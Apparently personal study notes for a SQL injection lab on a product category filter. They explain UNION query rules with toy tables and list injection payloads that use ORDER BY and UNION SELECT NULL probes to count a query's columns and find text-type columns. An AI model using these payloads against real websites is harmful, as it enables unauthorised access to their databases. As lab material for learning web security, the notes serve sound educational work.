SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

Step #1: Determine # of columns

SQLi attack (way #1):

select ? from table1 UNION select NULL, NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3

Step #2: Determine the data type of the columns


select a, b, c from table1 UNION select NULL, NULL, 'a'
-> error -> column is not type text
-> no error -> column is of type text

Analysis:

' order by 1--
-> 3 columns -> 1st column is not shown on the page.

' UNION select NULL, 'KsZXy4', NULL--
-> 2nd column of type string

' UNION select 'a', NULL, NULL--'
' UNION select NULL, 'a', NULL--



